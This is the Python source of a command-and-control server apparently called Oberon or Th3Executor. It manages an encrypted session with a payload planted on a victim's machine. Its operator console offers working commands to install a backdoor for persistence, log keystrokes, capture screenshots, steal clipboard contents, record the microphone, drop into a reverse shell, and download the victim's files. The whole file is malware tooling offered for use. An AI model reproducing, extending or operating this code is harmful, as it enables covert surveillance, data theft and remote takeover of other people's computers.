"""Oberon command and control framework.

This module defines the server portion of Oberon which manages the
network connection to the payload, performs key exchange and dispatches
commands.  The procedural version has been refactored into a set of
small classes for easier maintenance and testing.
"""

from __future__ import annotations

import logging
import os
import pickle
import socket
import subprocess
import time
import uuid
from dataclasses import dataclass
from typing import Any, Iterable, Optional

from Crypto.Cipher import ChaCha20
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import HKDF
from Crypto.Random import get_random_bytes
from Crypto.Util.number import getPrime, getRandomNBitInteger
from termcolor import colored

import ascii_art


@dataclass
class ServerConfig:
    """Configuration values for :class:`OberonServer`."""

    port: int = 5555  # SETUP SCRIPT WILL UPDATE THIS VALUE (DO NOT DELETE THIS COMMENT)
    max_retries: int = 3


class CryptoManager:
    """Handle Diffie-Hellman exchange and symmetric encryption."""

    def __init__(self) -> None:
        self.symmetric_key: Optional[bytes] = None

    def start_exchange(self, conn: socket.socket, bits: int = 2048) -> bytes:
        """Perform the Diffie-Hellman exchange and derive the symmetric key."""
        p = getPrime(bits)
        g = 2
        private_key = getRandomNBitInteger(bits)
        public_key = pow(g, private_key, p)
        conn.sendall(f"{p}\n".encode())
        conn.sendall(f"{g}\n".encode())
        conn.sendall(f"{public_key}\n".encode())
        client_public_key = int(conn.recv(4096).decode().strip())
        shared_secret = pow(client_public_key, private_key, p)
        self.symmetric_key = HKDF(
            shared_secret.to_bytes((shared_secret.bit_length() + 7) // 8, "big"),
            32,
            b"",
            SHA256,
        )
        return self.symmetric_key

    def attempt_exchange(self, conn: socket.socket) -> Optional[bytes]:
        """Attempt to establish a key up to ``max_retries`` times."""
        attempts = 0
        while attempts < ServerConfig.max_retries:
            try:
                return self.start_exchange(conn)
            except Exception as err:  # pylint: disable=broad-except
                print(
                    colored(
                        f"[-] Unable to establish cryptographic keys, "
                        f"re-attempting ... ({attempts+1}/3)",
                        "red",
                    )
                )
                log_activity(
                    f"Unable to establish cryptographic keys due to {err}, "
                    f"attempt ({attempts+1}/3)",
                    "error",
                )
                attempts += 1
                time.sleep(2)
        print(
            colored(
                "\n[-] Failed to establish a secure connection after several attempts. "
                "Try reconnecting with target!",
                "red",
            )
        )
        return None

    def encrypt(self, plaintext: Any) -> bytes:
        """Encrypt ``plaintext`` using ChaCha20."""
        if self.symmetric_key is None:
            raise RuntimeError("Symmetric key has not been established")
        if isinstance(plaintext, str):
            plaintext_bytes = plaintext.encode()
        else:
            plaintext_bytes = pickle.dumps(plaintext)
        nonce = get_random_bytes(12)
        cipher = ChaCha20.new(key=self.symmetric_key, nonce=nonce)
        return nonce + cipher.encrypt(plaintext_bytes)

    def decrypt(self, encrypted_message: bytes) -> Any:
        """Decrypt ``encrypted_message`` with the stored symmetric key."""
        if self.symmetric_key is None:
            raise RuntimeError("Symmetric key has not been established")
        if len(encrypted_message) < 12:
            print(
                colored(
                    "[-] Content received is too short to decrypt, skipping data."
                    " Try again with the same command",
                    "red",
                )
            )
            log_activity(
                "Data received from target contains too little information to be decrypted, "
                "data is skipped.",
                "error",
            )
            return None
        nonce, ciphertext = encrypted_message[:12], encrypted_message[12:]
        try:
            cipher = ChaCha20.new(key=self.symmetric_key, nonce=nonce)
            decrypted = cipher.decrypt(ciphertext)
            try:
                return pickle.loads(decrypted)
            except pickle.UnpicklingError:
                return decrypted
        except Exception as err:  # pylint: disable=broad-except
            print(
                f"[-] An unknown exception occurred: {err}, skipping data. Try again"
                " with the same command"
            )
            log_activity(
                f"An unknown error has occurred in the decryption function: {err}.",
                "error",
            )
            return None


class CommandProcessor:
    """Process high level commands sent to the target."""

    def __init__(self, conn: socket.socket, crypto: CryptoManager) -> None:
        self.conn = conn
        self.crypto = crypto

    # ------------------------------ Utilities ------------------------------
    @staticmethod
    def createfile_nocollision(header: str, footer: str = "") -> str:
        """Return a unique file name using ``uuid``."""
        def generate() -> str:
            if "." in header:
                parts = header.split(".")
                return f"{parts[0]}_{str(uuid.uuid4())[:4]}.{parts[1]}"
            return f"{header}_{str(uuid.uuid4())[:4]}{footer}"

        filename = generate()
        while os.path.exists(filename):
            filename = generate()
        return filename

    def _reliable_receive(self, data_size: int) -> Optional[bytes]:
        """Receive ``data_size`` bytes from the connection."""
        log_activity(
            f"Connection timeout changed to suit {data_size} bytes of data.", "info"
        )
        self.conn.settimeout(max(10, data_size / (1024 * 1024)))
        received_data = b""
        print("[!] Collecting data from target, processing time depends on item size")
        while len(received_data) < data_size:
            packet = self.conn.recv(min(4096, data_size - len(received_data)))
            if not packet:
                log_activity(
                    "Connection closed or data ended unexpectedly when "
                    "receiving screenshot data. Try again in a little moment.",
                    "error",
                )
                return None
            received_data += packet
        return received_data

    def _check_received(self, received_data: bytes, data_size: int) -> Any:
        """Validate and decrypt received bytes."""
        if len(received_data) != data_size:
            log_activity(
                f"Received data size ({len(received_data)}) does not match the expected "
                f"size ({data_size}).",
                "error",
            )
            return "Received data size does not match the expected size."
        decrypted = self.crypto.decrypt(received_data)
        if decrypted is None:
            log_activity(
                "Failed to decrypt screenshot or else data is corrupted. Try again in a "
                "little moment.",
                "error",
            )
            return "Data is corrupted or else is in an invalid format"
        return decrypted

    @staticmethod
    def clear_socket_buffer(conn: socket.socket) -> None:
        """Remove leftover bytes from the socket buffer."""
        original_timeout = conn.gettimeout()
        conn.settimeout(0.20)
        try:
            while True:
                if conn.recv(4096) == b"":
                    break
        except socket.timeout:
            pass
        finally:
            conn.settimeout(original_timeout)

    @staticmethod
    def clear_screen() -> None:
        """Clear the terminal screen."""
        if os.name == "nt":
            os.system("cls")
        else:
            subprocess.run(["clear"], shell=True, check=True)

    # --------------------------- Command Methods --------------------------
    def sys_info(self, client_output: bytes) -> str:
        """Return nicely formatted system information."""
        message = self.crypto.decrypt(client_output)
        if isinstance(message, list):
            result: list[str] = []
            for info in message:
                if "No information found" in info:
                    result.append(colored(f"[-] {info}", "red"))
                else:
                    result.append(colored(f"[+] {info}", "green"))
            return "\n".join(result)
        log_activity(
            "Unexpected data type received when trying to gather system "
            "information about target system.",
            "error",
        )
        return colored("[-] Unexpected data type received", "red")

    def persist_del(self, client_output: bytes) -> str:
        """Process the output of the delete persistence command."""
        message = self.crypto.decrypt(client_output).decode()
        if message == "no_exist":
            return colored("[-] No persistance is currently active on the machine", "red")
        if message == "permission_denied":
            return colored("[-] Unable to delete : Permission Denied", "red")
        if message == "success":
            return colored("[+] Persistance successfully deleted from target machine", "green")
        if message == "fail":
            return colored(
                "[-] An unknown error has occured when trying to delete persistance",
                "red",
            )
        return colored(
            "[-] Unable to parse persistance output. This operation may or may not have worked",
            "red",
        )

    def persist(self, client_output: bytes) -> str:
        """Process the output of the persist command."""
        message = self.crypto.decrypt(client_output).decode()
        if message == "created":
            log_activity(
                "Th3Executor backdoor installed successfully on target machine. "
                "Persistance is now active.",
                "info",
            )
            return colored(
                "[+] Th3Executor backdoor installed successfully on target machine. "
                "Persistance is now active",
                "green",
            )
        if message == "not_windows":
            log_activity(
                "Target is not using a windows machine, persistance will not work.",
                "error",
            )
            return colored(
                "[-] Target is not using a windows machine, persistance will not work",
                "red",
            )
        if message == "already_created":
            log_activity("Target already has persistance active on machine.", "debug")
            return colored("[-] Target already has persistance active", "red")
        log_activity(
            "An unidentified error has occured when attempting to create persistance.",
            "error",
        )
        return colored(
            "[-] An unidentified error has occured when attempting to create persistance",
            "red",
        )

    def screenshot(self, client_output: bytes) -> str:
        """Save a screenshot sent by the client to disk."""
        filename = self.createfile_nocollision("screenshot_data", ".png")
        original_timeout = self.conn.gettimeout()
        attempt = 0
        max_attempts = 3
        while attempt < max_attempts:
            try:
                if client_output is None:
                    log_activity(
                        "The size of the decrypted data received is invalid. Please check your input and try the command again.",
                        "error",
                    )
                    raise ValueError(
                        "Decrypted size is received invalid, please try the command again"
                    )
                data_size = int(client_output.decode().strip())
                received_data = self._reliable_receive(data_size)
                decrypted = self._check_received(received_data or b"", data_size)
                if isinstance(decrypted, str) and "Failed" in decrypted:
                    print(f"[!] An error has occured! {decrypted}")
                    break
                if isinstance(decrypted, bytes) and not decrypted.startswith(b"\x89PNG\r\n\x1a\n"):
                    log_activity(
                        f"Decrypted data does not start with a PNG signature ({decrypted[:10]}). Try again in a little moment.",
                        "error",
                    )
                    raise ValueError("Decrypted data does not start with PNG signature")
                if isinstance(decrypted, bytes):
                    with open(filename, "wb") as img:
                        img.write(decrypted)
                    log_activity(
                        f"Screenshot {filename} has been saved in current program directory.",
                        "info",
                    )
                    return colored(
                        f"[+] Screenshot image has been saved as {filename}", "green"
                    )
            except Exception as exc:  # pylint: disable=broad-except
                attempt += 1
                log_activity(
                    f"Error when capturing screenshot ({exc}). "
                    f"Retrying image capture on target, attempt {attempt}/{max_attempts}",
                    "error",
                )
                print(
                    colored(
                        f"[-] Error when capturing screenshot. "
                        f"Retrying image capture on target, attempt {attempt}/{max_attempts} ...",
                        "red",
                    )
                )
                time.sleep(2)
            finally:
                self.conn.settimeout(original_timeout)
                self.clear_socket_buffer(self.conn)
        return colored("[-] Failed to capture screenshot after several attempts.", "red")

    def clipboard_steal(self, client_output: bytes) -> str:
        """Listen for clipboard entries from the target."""
        received_data: list[str] = []
        message = self.crypto.decrypt(client_output)
        if message.decode() != "STARTED":
            return colored(
                "[-] An error has occured when starting the clipboard steal function. "
                "Please try again in a few moments.",
                "red",
            )
        self.conn.settimeout(0.5)
        print(f"\nStarted clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}")
        while True:
            try:
                input("Press Ctrl+C to stop and receive clipboard data: ")
            except KeyboardInterrupt:
                self.conn.sendall(self.crypto.encrypt("END"))
                print(
                    f"\nEnded clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}\n"
                )
                break
            print("Invalid data, only press 'Ctrl+C' to stop")
        try:
            while True:
                try:
                    output = self.crypto.decrypt(self.conn.recv(4096))
                    if output:
                        decoded = output.strip().decode()
                        received_data.extend(decoded.split("\n"))
                    else:
                        break
                except socket.timeout:
                    break
        except Exception as err:  # pylint: disable=broad-except
            print(f"[-] Error when trying to gather clipboard data: {err}")
        try:
            if not received_data:
                log_activity("No clipboard entries have been gathered.", "info")
                return "[-] No clipboard data gathered from target"
            print("Loading clipboard data . . .")
            print("Gathred clipboard data :")
            result, counter = [], 0
            for data in received_data:
                counter += 1
                if data:
                    result.append(colored(f"[+] Clipboard Entry {counter} -> {data}", "green"))
            self.conn.settimeout(10)
            log_activity(f"Gathred {len(result)} clipboard entries.", "info")
            return "\n".join(result)
        finally:
            self.clear_socket_buffer(self.conn)

    # ---------------------------- Shell Methods ----------------------------
    def _process_shell_prompt(self, output: bytes) -> str:
        self.clear_socket_buffer(self.conn)
        try:
            decrypted_message = self.crypto.decrypt(output).decode()
            shell_prompt, message = "", ""
            if "::" in decrypted_message:
                parts = decrypted_message.split("::")
                if len(parts) == 2:
                    message, shell_prompt = parts
                else:
                    message = decrypted_message
                    shell_prompt = "No Username"
                print(message)
            else:
                shell_prompt = decrypted_message
            if shell_prompt == "No Username":
                raise Exception()
        except Exception:  # pylint: disable=broad-except
            print("[-] Unable to establish current shell path, using default placeholder instead")
            shell_prompt = "th3executor_victim_shell > "
        return shell_prompt

    def _download(self, usr_input: str) -> str:
        if len(usr_input) <= 9:
            return "[-] Incorrect command usage. Specify 'download' followed by the file path"
        self.conn.sendall(self.crypto.encrypt(usr_input))
        try:
            data_size = int(self.crypto.decrypt(self.conn.recv(1024)).decode().strip())
            if not data_size:
                return "[-] No data has been recieved from target."
            file_data = self._reliable_receive(data_size)
            if not file_data:
                return "[-] No file data has been recieved from target."
            if isinstance(data_size, str):
                return f"[-] An error occured when trying to get the file size. {file_data}"
            file_data = self._check_received(file_data, data_size)
            if isinstance(file_data, str):
                return f"[-] An error occured when trying to get the file data. {file_data}"
        except Exception as err:  # pylint: disable=broad-except
            return f"[-] An unidentified error has occured : {err}"
        if file_data:
            base_file = os.path.basename(usr_input[9:])
            file_path = self.createfile_nocollision(f"downloaded_{base_file}")
            with open(file_path, "wb") as file:
                file.write(file_data)
            return "saved"
        return "[-] No data has been recieved from the target. This can be due to a network issue, Try again."

    @staticmethod
    def shell_banner() -> None:
        banner = colored(ascii_art.oberon_main_banner_3, attrs=["bold"])
        text = colored("\n- Embrace Power - Command and Conquer with Th3executor \n", attrs=["dark"])
        print(banner + text)

    @staticmethod
    def shell_cheat_sheet() -> None:
        print(colored("S H E L L  CHEAT  SHEET  MENU", attrs=["bold"]))
        print(colored("WINDOWS COMMANDS", "blue", attrs=["bold", "dark"]))
        win = {
            "ipconfig": "Enumerate network configuration",
            "tasklist": "List all running processes",
            "systeminfo": "Display detailed system information",
            "netstat -an": "Display all active connections and listening ports",
            "whoami": "Display the current user",
            "net user": "List all user accounts",
            "net localgroup": "List all local groups",
            "sc query": "Display the status of services",
            "dir": "List directory contents",
            "attrib": "Display or change file attributes",
        }
        for cmd, desc in win.items():
            print(f"> {cmd:<20} - {desc}")
        print("\n\t\t    >-------------<")
        print(colored("LINUX COMMANDS", "blue", attrs=["bold", "dark"]))
        lin = {
            "ifconfig": "Enumerate network configuration",
            "ps aux": "List all running processes",
            "uname -a": "Display detailed system information",
            "netstat -an": "Display all active connections and listening ports",
            "whoami": "Display the current user",
            "cat /etc/passwd": "List all user accounts",
            "cat /etc/group": "List all groups",
            "systemctl status": "Display the status of services",
            "ls -la": "List directory contents",
            "chmod": "Change file permissions",
        }
        for cmd, desc in lin.items():
            print(f"> {cmd:<20} - {desc}")

    @staticmethod
    def shell_help() -> None:
        banner = colored("\nS H E L L   M E N U", "green", attrs=["bold", "dark"])
        print(banner)
        print(colored("-" * 66, "green"))
        descriptions = {
            "download <file_path>": "Download a file from the victim's machine",
            "upload <file_path>": "Upload a file to the victim's machine",
            "help": "Display this help menu",
            "commands_help": "Display a windows and linux shell cheat sheet",
            "exit": "Exit the shell and return to th3executor",
        }
        for command, description in descriptions.items():
            print(f"> {command:<20} - {description}")
        print(colored("-" * 66, "green"))

    def shell_load(self, client_output: bytes) -> str:
        print("Loading up a shell enviroment . . .")
        time.sleep(1.5)
        self.clear_screen()
        self.shell_banner()
        self.shell_command(client_output)
        return "Shell Exited Successfully"

    # ------------------------------------------------------------------
    def shell_command(self, client_output: bytes) -> None:
        print(
            f"[!] {colored('REVERSE SHELL ACTIVE', 'green')} - Type 'quit' or 'exit' to exit shell command"
        )
        print("[!] Type 'help' to view the shell help menu \n")
        usr_input = ""
        shell_prompt = self._process_shell_prompt(client_output)
        while True:
            self.clear_socket_buffer(self.conn)
            usr_input = input("\n" + colored(shell_prompt, attrs=["bold"])).strip()
            if usr_input in ("clear", "cls"):
                self.clear_screen()
                self.shell_banner()
                continue
            if usr_input in ("quit", "exit"):
                self.clear_socket_buffer(self.conn)
                print("Redirecting you back to th3executor . . .")
                time.sleep(1.5)
                self.clear_screen()
                intro_banner()
            if usr_input == "help":
                self.shell_help()
                continue
            if usr_input == "commands_help":
                self.shell_cheat_sheet()
                continue
            self.conn.sendall(self.crypto.encrypt(usr_input))
            if usr_input in ("quit", "exit"):
                break
            if usr_input.startswith("download "):
                download_output = self._download(usr_input)
                if download_output != "saved":
                    print(f"[-] An error has occured when downloading the file. {download_output}")
                else:
                    print(f"[+] File {usr_input[9:]} has been saved successfully in current directory")
                continue
            if usr_input.startswith("upload"):
                pass  # placeholder
            retry_counter = 0
            while retry_counter != 2:
                try:
                    output = self.crypto.decrypt(self.conn.recv(4096)).decode()
                    output = output.replace("[NEWLINE]", "\n")
                    break
                except Exception:  # pylint: disable=broad-except
                    retry_counter += 1
                    continue
            if retry_counter == 3:
                print(
                    "[-] Unable to parse and decrypt output from target after several attempts, skipping"
                )
            else:
                print(output)


class OberonServer:
    """Main server class responsible for user interaction."""

    def __init__(self, config: ServerConfig) -> None:
        self.config = config
        self.conn: Optional[socket.socket] = None
        self.crypto = CryptoManager()
        self.processor: Optional[CommandProcessor] = None
        configure_logging()

    @staticmethod
    def intro_banner() -> None:
        banner = colored(ascii_art.oberon_main_banner_1, "red", attrs=["bold"])
        intro_msg = colored("\nSilence the Noise, Amplify the Impact\n", attrs=["bold"])
        print(banner + intro_msg)

    def connect_target(self) -> socket.socket:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.bind(("0.0.0.0", self.config.port))
        listener.listen(1)
        print(f"[!] Listening for incoming connections on port {self.config.port} ...")
        conn, _addr = listener.accept()
        return conn

    def handle_reconnections(self) -> Optional[socket.socket]:
        print(colored("[-] A fatal error has occurred, the target terminated the connection", "red"))
        if input("Retry Connection (y/n)? > ").strip().lower() == "y":
            print("\n[!] Reattempting . . .")
            conn = self.connect_target()
            print(colored("[+] Reconnected to target!", "green", attrs=["bold"]))
            log_activity("Reconnected to target successfully.", "info")
            if self.crypto.attempt_exchange(conn) is None:
                log_activity(
                    "Failed to establish a symmetric key with the client during the Diffie-Hellman exchange after reconnection. Check network conditions and client configurations.",
                    "error",
                )
                conn.close()
                return None
            return conn
        log_activity(
            "Program ended because the user did not want to reconnect with the target again.",
            "info",
        )
        raise SystemExit("Program ended")

    def disconnect_target(self, shutdown_signal: Optional[str]) -> None:
        try:
            self.conn.close()  # type: ignore[union-attr]
            log_activity(
                "Exited th3executor, connection terminated successfully on server end",
                "info",
            )
        except Exception as err:  # pylint: disable=broad-except
            print("[-] Program ended abruptly, no connection was probably established with target")
            log_activity(
                f"Exited th3executor, could not terminate connection on server side -> {err}",
                "error",
            )
        if not shutdown_signal or shutdown_signal == "connection_not_closed":
            print(colored("[-] Target did not terminate the connection on their end", "red"))
            print(
                colored(
                    "[!] This can be due to a network problem, please wait a few moments before re-connecting",
                    "yellow",
                )
            )
            log_activity("Exited th3executor, connection was not terminated on targets end.", "error")
        elif shutdown_signal == "shutdown_confirmed":
            print(colored("[+] Connection terminated successfully on targets end", "green"))
            log_activity(
                "Exited th3executor, connection terminated normally between both parties.",
                "info",
            )
        else:
            print(
                colored(
                    "[-] Unknown shutdown code retireved, unable to parse output. Connection is probably still open",
                    "red",
                )
            )
            print(
                colored(
                    "[!] This can be due to a network problem, please wait a few moments before re-connecting",
                    "yellow",
                )
            )
            log_activity(
                "Unknown shutdown code retireved, unable to parse output. Connection is probably still open.",
                "error",
            )

    def print_help_menu(self, commands: Iterable[str]) -> None:
        banner = colored("\nT H 3 E X E C U T O R   H E L P   M E N U", "red", attrs=["bold", "dark"])
        print(banner)
        print(colored("-" * 65, "red"))
        descriptions = {
            "kill": "Terminate and close the connection",
            "help": "Display this help menu",
            "persist": "Attempt to install a backdoor",
            "del_persist": "Attempt to remove the backdoor",
            "keylog_start": "Attempt to eavesdrop on keystrokes",
            "screenshot": "Capture image of targets screen",
            "sys_info": "Retrieve system information of the target",
            "shell": "Drop into a command shell on the target system",
            "migrate": "Transition to a new secure channel (New keys)",
            "clipboard_steal": "Listen for clipboard entries from target",
            "mic_record": "Attempt to record the targets microphone",
        }
        for command in commands:
            desc = descriptions.get(command, "No description available.")
            print(colored(f"> {command:<15} - {desc}", "white"))
        print(colored("-" * 65, "red"))

    # ------------------------------------------------------------------
    def run(self) -> None:
        self.intro_banner()
        try:
            self.conn = self.connect_target()
        except Exception as err:  # pylint: disable=broad-except
            raise SystemExit(colored(f"[-] Unable to connect to target : {err}", "red")) from err
        self.conn.settimeout(10)
        print(colored("[+] Connected to target", "green", attrs=["bold"]))
        log_activity(f"Session started with target on port {self.config.port}.", "info")
        print("[!] Establishing a secure connection ...")
        if self.crypto.attempt_exchange(self.conn) is None:
            log_activity(
                "Failed to establish a symmetric key with the client during the Diffie-Hellman exchange. Check network conditions and client configurations.",
                "error",
            )
            self.conn.close()
            raise SystemExit
        print(colored("[+] Secure channel established", "green", attrs=["bold"]))
        log_activity("Key exchange completed, a secure channel has now been created.", "info")
        self.processor = CommandProcessor(self.conn, self.crypto)
        commands = [
            "kill",
            "help",
            "persist",
            "del_persist",
            "keylog_start",
            "screenshot",
            "sys_info",
            "shell",
            "migrate",
            "clipboard_steal",
            "mic_record",
        ]
        self.print_help_menu(commands)
        shutdown_signal: Optional[str] = None
        while True:
            try:
                command = input(colored("\nMagic Keyword > ", attrs=["bold"])).strip().lower()
            except KeyboardInterrupt:
                log_activity("User interrupted program with a keyboard interrupt.", "info")
                break
            if command not in commands:
                print("Invalid Command! Refer to help menu")
                continue
            if command == "help":
                self.print_help_menu(commands)
                continue
            if command == "kill":
                self.conn.sendall(self.crypto.encrypt(command))
                self.conn.settimeout(5)
                shutdown_signal = self.crypto.decrypt(self.conn.recv(4096)).decode()
                if shutdown_signal == "retry":
                    self.conn.sendall(self.crypto.encrypt(command))
                    shutdown_signal = self.crypto.decrypt(self.conn.recv(4096)).decode()
                break
            try:
                self.conn.sendall(self.crypto.encrypt(command))
                client_output = self.conn.recv(4096).strip()
                if self.crypto.decrypt(client_output).decode() == "retry":
                    self.conn.sendall(self.crypto.encrypt(command))
                    client_output = self.conn.recv(4096).strip()
                if "No information gathered" in self.crypto.decrypt(client_output).decode() or self.crypto.decrypt(client_output).decode() is None:
                    print(f"[-] No information recieved from target when initiating command {command}")
                    continue
            except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
                reconnect = self.handle_reconnections()
                if reconnect is None:
                    log_activity(
                        "Unable to establish a secure connection with the target. Exiting application due to critical network failure.",
                        "error",
                    )
                    raise SystemExit(colored("[-] Unable to establish a secure connection with target. Exiting application", "red"))
                self.conn = reconnect
                self.conn.settimeout(10)
                self.processor = CommandProcessor(self.conn, self.crypto)
                continue
            except (socket.timeout, TimeoutError):
                print(colored("[-] Timeout reached, skipping data . . .", "red"))
                log_activity(
                    "Timeout reached when trying to recieve data from target, data was skipped.",
                    "debug",
                )
                continue
            except Exception:  # pylint: disable=broad-except
                print(colored("[-] An unknown error has occured, skipping data", "red"))
                continue
            output: Optional[str] = None
            try:
                if command == "sys_info":
                    output = self.processor.sys_info(client_output)
                elif command == "persist":
                    output = self.processor.persist(client_output)
                elif command == "del_persist":
                    output = self.processor.persist_del(client_output)
                elif command == "screenshot":
                    output = self.processor.screenshot(client_output)
                elif command == "clipboard_steal":
                    output = self.processor.clipboard_steal(client_output)
                elif command == "shell":
                    output = self.processor.shell_load(client_output)
            except (ConnectionAbortedError, ConnectionResetError, ConnectionError, EOFError):
                log_activity("Connection with target and server has been dropped.", "debug")
                reconnect = self.handle_reconnections()
                if reconnect is None:
                    log_activity(
                        "Unable to re-connect with target, either the symmetric key was not established or the target refused to connect.",
                        "error",
                    )
                    raise SystemExit(colored("[-] Unable to establish a secure connection with target. Exiting application", "red"))
                self.conn = reconnect
                self.conn.settimeout(10)
                self.processor = CommandProcessor(self.conn, self.crypto)
                continue
            except Exception:  # pylint: disable=broad-except
                output = None
            finally:
                if output is None or output == "No information gathered":
                    print(colored("[-] Unable to recieve data from target, skipping", "red"))
                    log_activity(
                        "Data recieved from target contains no information or server is unable to parse information recieved from target.",
                        "debug",
                    )
                else:
                    log_activity(
                        f"Initiated command '{command}' to target which was executed successfully.",
                        "info",
                    )
                    print(output)
        self.disconnect_target(shutdown_signal)
        print(colored("\n[+] Program Ended - Come back another time", "yellow", attrs=["bold"]))


def configure_logging() -> None:
    current_date = time.strftime("%d-%m-%Y", time.localtime())
    log_file = CommandProcessor.createfile_nocollision(f"log_{current_date}", ".log")
    logging.basicConfig(
        filename=log_file,
        filemode="a",
        encoding="utf-8",
        format="%(asctime)s - %(name)s → %(levelname)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        level=logging.DEBUG,
    )
    with open(log_file, "w", encoding="utf-8") as file_log:
        file_log.write(ascii_art.oberon_main_banner_2)


def log_activity(audit_message: str, log_level: str) -> None:
    try:
        logger = logging.getLogger()
        getattr(logger, log_level.lower())(audit_message)
    except Exception as err:  # pylint: disable=broad-except
        print(colored(f"[-] Unable to add log due to {err}. Skipping audit", "red"))


def intro_banner() -> None:
    """Print the intro banner."""
    OberonServer.intro_banner()


def main() -> None:
    """Entry point for module execution."""
    server = OberonServer(ServerConfig())
    server.run()


if __name__ == "__main__":
    main()
